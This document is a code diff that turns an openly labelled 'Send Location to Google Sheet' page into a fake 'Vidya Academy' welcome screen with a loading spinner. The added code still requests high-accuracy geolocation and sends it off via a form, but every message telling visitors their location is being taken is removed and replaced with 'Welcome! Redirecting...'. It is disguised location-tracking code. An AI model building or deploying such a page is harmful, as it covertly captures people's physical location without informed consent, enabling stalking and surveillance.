@@ -2,14 +2,279 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>Send Location (form/iframe method)</title>
+  <title>Welcome to Vidya Academy</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <meta name="referrer" content="no-referrer" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #0a5f4e 0%, #0d7a63 50%, #fdb913 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    /* Animated background elements */
+    .bg-shapes {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      z-index: 0;
+    }
+    
+    .shape {
+      position: absolute;
+      opacity: 0.1;
+      animation: float 20s infinite ease-in-out;
+    }
+    
+    .shape:nth-child(1) {
+      width: 80px;
+      height: 80px;
+      background: #fdb913;
+      border-radius: 50%;
+      top: 10%;
+      left: 10%;
+      animation-delay: 0s;
+    }
+    
+    .shape:nth-child(2) {
+      width: 60px;
+      height: 60px;
+      background: #fff;
+      border-radius: 50%;
+      top: 70%;
+      left: 80%;
+      animation-delay: 2s;
+    }
+    
+    .shape:nth-child(3) {
+      width: 100px;
+      height: 100px;
+      background: #fdb913;
+      border-radius: 20px;
+      top: 50%;
+      left: 5%;
+      animation-delay: 4s;
+    }
+    
+    .shape:nth-child(4) {
+      width: 70px;
+      height: 70px;
+      background: #fff;
+      border-radius: 50%;
+      top: 20%;
+      right: 15%;
+      animation-delay: 1s;
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0) rotate(0deg); }
+      50% { transform: translateY(-30px) rotate(180deg); }
+    }
+    
+    /* Main container */
+    .container {
+      text-align: center;
+      z-index: 1;
+      padding: 40px 20px;
+      max-width: 500px;
+      width: 90%;
+    }
+    
+    /* Logo */
+    .logo {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 30px;
+      background: white;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+      animation: pulse 2s infinite;
+    }
+    
+    .logo-text {
+      font-size: 48px;
+      font-weight: bold;
+      color: #0a5f4e;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+    
+    /* Title */
+    h1 {
+      color: white;
+      font-size: 36px;
+      margin-bottom: 15px;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+      animation: fadeInDown 1s ease-out;
+    }
+    
+    .subtitle {
+      color: #fdb913;
+      font-size: 18px;
+      margin-bottom: 40px;
+      font-weight: 500;
+      animation: fadeInUp 1s ease-out;
+    }
+    
+    @keyframes fadeInDown {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    /* Loading spinner */
+    .spinner-container {
+      margin: 30px 0;
+    }
+    
+    .spinner {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-top: 5px solid #fdb913;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    /* Status text */
+    #status {
+      color: white;
+      font-size: 16px;
+      margin-top: 20px;
+      min-height: 24px;
+      opacity: 0.9;
+    }
+    
+    /* Continue button */
+    #continueBtn {
+      display: none;
+      margin: 30px auto 0;
+      padding: 15px 40px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #0a5f4e;
+      background: #fdb913;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 5px 20px rgba(253, 185, 19, 0.4);
+      transition: all 0.3s ease;
+      animation: fadeIn 0.5s ease-out;
+    }
+    
+    #continueBtn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(253, 185, 19, 0.6);
+    }
+    
+    #continueBtn:active {
+      transform: translateY(0);
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    /* Loading dots animation */
+    .loading-dots {
+      display: inline-block;
+      margin-left: 5px;
+    }
+    
+    .loading-dots span {
+      animation: blink 1.4s infinite;
+      animation-fill-mode: both;
+    }
+    
+    .loading-dots span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    
+    .loading-dots span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+    
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0; }
+      40% { opacity: 1; }
+    }
+    
+    /* Tagline */
+    .tagline {
+      color: rgba(255,255,255,0.8);
+      font-size: 14px;
+      margin-top: 40px;
+      font-style: italic;
+    }
+  </style>
 </head>
 <body>
-  <h2>Send Location to Google Sheet</h2>
-  <p id="status">Requesting location permission...</p>
-  <button id="continueBtn" style="display:none; padding:10px 14px; font-size:16px;">Click here to continue</button>
+  <div class="bg-shapes">
+    <div class="shape"></div>
+    <div class="shape"></div>
+    <div class="shape"></div>
+    <div class="shape"></div>
+  </div>
+  
+  <div class="container">
+    <div class="logo">
+      <div class="logo-text">VA</div>
+    </div>
+    
+    <h1>Vidya Academy</h1>
+    <div class="subtitle">Learning through Fun & Creativity</div>
+    
+    <div class="spinner-container">
+      <div class="spinner"></div>
+    </div>
+    
+    <p id="status">Preparing your experience<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></p>
+    
+    <button id="continueBtn">Continue to Website</button>
+    
+    <p class="tagline">Kundapura's Premier Educational Institution</p>
+  </div>
 
   <script>
     // ----- CONFIG -----
@@ -23,16 +288,16 @@
   let retryHandle = null;
   let geoPermissionStatus = null;
   let tempWatchId = null; // temporary watch to better trigger prompts on mobile
-  let continueRedirectTimer = null; // fallback redirect after manual click if no success
 
     // Encapsulate request flow so we can trigger on load AND via button (as retry)
     function requestAndSend() {
-      statusEl.textContent = 'Requesting location permission...';
+      // Keep status subtle for loading screen
       if (!navigator.geolocation) {
-        statusEl.textContent = 'Geolocation not supported on this device/browser.';
+        // Silent fallback - just redirect
+        setTimeout(() => safeRedirect(), 2000);
         return;
       }
-      const opts = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+  const opts = { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 };
       // Regular one-shot request
       navigator.geolocation.getCurrentPosition(success, fail, opts);
 
@@ -66,13 +331,8 @@
           geoPermissionStatus = st;
           st.onchange = () => {
             if (st.state === 'granted') {
-              statusEl.textContent = 'Permission granted. Trying again...';
               clearTimeout(retryHandle);
               requestAndSend();
-            } else if (st.state === 'prompt') {
-              statusEl.textContent = 'Please allow location when prompted.';
-            } else if (st.state === 'denied') {
-              statusEl.textContent = 'Location permission is blocked. Enable it in your browser settings for this site.';
             }
           };
         }
@@ -80,16 +340,10 @@
       requestAndSend();
     });
 
-    // Manual continue button: trigger geolocation under a user gesture and set fallback redirect
+    // Manual continue button handler: retry geolocation only (no auto-redirect timer)
     continueBtn.addEventListener('click', () => {
       try { continueBtn.style.display = 'none'; } catch(_){}
-      clearTimeout(continueRedirectTimer);
-      // Immediate attempt to trigger permission prompt under gesture
       requestAndSend();
-      // If no success within a short window, redirect anyway per request
-      continueRedirectTimer = setTimeout(() => {
-        safeRedirect();
-      }, 8000);
     });
 
     // If the user toggles OS location and returns to the tab/app, try again automatically
@@ -101,9 +355,7 @@
     window.addEventListener('focus', () => scheduleRetry(1000));
 
     function success(pos) {
-      statusEl.textContent = 'Got location. Sending...';
-      // Cancel any pending manual-continue fallback redirect
-      clearTimeout(continueRedirectTimer);
+      statusEl.innerHTML = 'Loading<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
       // Clear any temporary watch we might have started to trigger the prompt
       try {
         if (tempWatchId != null) {
@@ -114,12 +366,7 @@
       try { continueBtn.style.display = 'none'; } catch(_){}
       // Keep the same send method; redirect after it resolves (or times out via internal fallback)
       sendViaForm(pos).then(r => {
-        if (r && r.ok) {
-          statusEl.textContent = 'Sent successfully! Redirecting...';
-        } else {
-          statusEl.textContent = 'Send may have failed. Redirecting...';
-          console.log('send result', r);
-        }
+        statusEl.textContent = 'Welcome! Redirecting...';
         safeRedirect();
       });
     }
@@ -127,28 +374,18 @@
     function fail(err) {
       // Error codes: 1 PERMISSION_DENIED, 2 POSITION_UNAVAILABLE, 3 TIMEOUT
       const code = (err && err.code) || 0;
-      let hint = '';
-      if (code === 1) {
-        hint = 'Please allow location for this site in your browser settings.';
-      } else if (code === 2) {
-        hint = 'Please turn on device Location/GPS and ensure signal is available.';
-      } else if (code === 3) {
-        hint = 'Timed out. Move to an open area or check connectivity.';
-      }
-      statusEl.textContent = 'Location error: ' + (err && err.message ? err.message : 'Unknown') + (hint ? ' ' + hint : '');
 
-      // Ask for notification permission to nudge the user and keep them informed
-      maybeNotifyToEnableLocation(hint);
-
-      // Reveal the manual continue button so the user can trigger the prompt and/or redirect
-      try { continueBtn.style.display = 'inline-block'; } catch(_){}
+      // Keep status minimal; show a manual redirect button so user can proceed after enabling Location
+      statusEl.innerHTML = 'Almost ready<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
+      try {
+        continueBtn.textContent = 'Redirect';
+        continueBtn.style.display = 'inline-block';
+      } catch(_) {}
 
       // Schedule an automatic retry —
-      // If permission is granted but services are off (code 2), keep retrying.
-      // If permission is prompt/denied, we rely on the permission onchange listener.
-      // Retry if services are off/unavailable/timeout, or we don't know permission yet,
-      // or permission isn't explicitly denied (so prompt/unknown).
-      const shouldRetry = code === 2 || code === 3 || !geoPermissionStatus || geoPermissionStatus.state !== 'denied';
+      // Retry only if services are off/unavailable/timeout. If permission is denied,
+      // we wait for the user to change it and click the button.
+      const shouldRetry = code === 2 || code === 3;
       if (shouldRetry) {
         scheduleRetry();
       }
@@ -157,25 +394,11 @@
     function scheduleRetry(delayMs = 8000) {
       clearTimeout(retryHandle);
       retryHandle = setTimeout(() => {
-        statusEl.textContent = 'Retrying to get location...';
         requestAndSend();
       }, delayMs);
     }
 
-    async function maybeNotifyToEnableLocation(extra) {
-      try {
-        if (!('Notification' in window)) return;
-        let perm = Notification.permission;
-        if (perm === 'default') {
-          // Request permission; may be ignored on some browsers without gesture
-          perm = await Notification.requestPermission();
-        }
-        if (perm === 'granted') {
-          const body = (extra ? extra + ' ' : '') + 'After enabling, return to this page; it will retry automatically.';
-          new Notification('Turn on Location Services', { body });
-        }
-      } catch (_) {}
-    }
+    // Notification/alert guidance removed for maximum compatibility and fewer blockers
 
     // Helper to perform a safe redirect with a tiny delay allowing UI updates to paint
     function safeRedirect() {
@@ -184,11 +407,11 @@
           const target = (REDIRECT_URL || '').trim();
           if (!/^https?:\/\//i.test(target)) {
             console.warn('Invalid REDIRECT_URL, falling back to default:', target);
-            statusEl.textContent = 'Redirecting...';
-            window.location.assign('https://banudeep-portfolio.web.app/');
+            statusEl.textContent = 'Welcome!';
+            window.location.assign('https://thevidyaacademy.com/');
             return;
           }
-          statusEl.textContent = 'Redirecting to ' + target + ' ...';
+          statusEl.textContent = 'Welcome!';
           window.location.assign(target);
         } catch (e) {
           // As a fallback, try assigning via location.replace (doesn't create history entry)
